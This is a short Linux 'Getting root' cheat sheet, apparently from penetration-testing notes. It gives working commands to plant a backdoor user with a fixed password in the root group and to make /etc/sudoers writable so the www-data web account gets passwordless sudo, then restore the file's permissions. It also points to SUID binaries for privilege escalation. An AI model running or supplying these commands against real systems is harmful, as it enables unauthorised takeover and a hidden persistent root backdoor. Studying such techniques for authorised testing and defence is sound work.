# Getting root

## Linux

* Method 1 : Create a new user with root privileges
  * useradd -p $\(openssl passwd -1 “newpassword”\) user1
  * usermod -g root user1
* Method 2 : Given we have su command executable, change the configuration such that it does not asks for password.
  * chmod 777 /etc/sudoers && 
  * echo "www-data ALL=NOPASSWD: ALL" &gt;&gt; /etc/sudoers && 
  * chmod 440 /etc/sudoers
* Method 3 : Find a executable with root privileges with suid bit enabled.



